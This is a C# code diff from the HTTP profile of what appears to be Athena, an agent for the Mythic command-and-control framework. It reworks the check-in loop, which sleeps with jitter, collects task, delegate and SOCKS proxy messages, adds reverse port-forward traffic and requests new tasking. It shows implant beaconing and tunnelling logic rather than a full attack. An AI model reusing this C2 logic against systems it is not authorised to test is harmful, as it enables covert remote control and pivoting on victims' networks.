@@ -1,15 +1,16 @@
 ﻿using Athena.Commands;
-using Athena.Models.Athena.Commands;
+using Athena.Models.Commands;
 using Athena.Models.Config;
 using Athena.Models.Mythic.Checkin;
-using Athena.Models.Mythic.Response;
-using Athena.Models.Mythic.Tasks;
+using Athena.Models.Comms.SMB;
 using Athena.Utilities;
 
 using System.Diagnostics;
 using System.Net;
 using System.Net.Security;
 using System.Text.Json;
+using Athena.Models.Mythic.Tasks;
+using Athena.Models.Proxy;
 
 namespace Athena.Profiles.HTTP
 {
@@ -130,18 +131,18 @@ namespace Athena.Profiles.HTTP
                 await Task.Delay(await Misc.GetSleep(this.sleep, this.jitter) * 1000);
                 Task<List<string>> responseTask = TaskResponseHandler.GetTaskResponsesAsync();
                 Task<List<DelegateMessage>> delegateTask = DelegateResponseHandler.GetDelegateMessagesAsync();
-                Task<List<SocksMessage>> socksTask = SocksResponseHandler.GetSocksMessagesAsync();
-                await Task.WhenAll(responseTask, delegateTask, socksTask);
-
-                List<string> responses = await responseTask;
+                Task<List<MythicDatagram>> socksTask = ProxyResponseHandler.GetSocksMessagesAsync();
+                Task<List<MythicDatagram>> rpFwdTask = ProxyResponseHandler.GetRportFwdMessagesAsync();
+                await Task.WhenAll(responseTask, delegateTask, socksTask, rpFwdTask);
 
                 GetTasking gt = new GetTasking()
                 {
                     action = "get_tasking",
                     tasking_size = -1,
-                    delegates = await delegateTask,
-                    socks = await socksTask,
-                    responses = responses,
+                    delegates = delegateTask.Result,
+                    socks = socksTask.Result,
+                    responses = responseTask.Result,
+                    rpfwd = rpFwdTask.Result,
                 };
                 try
                 {
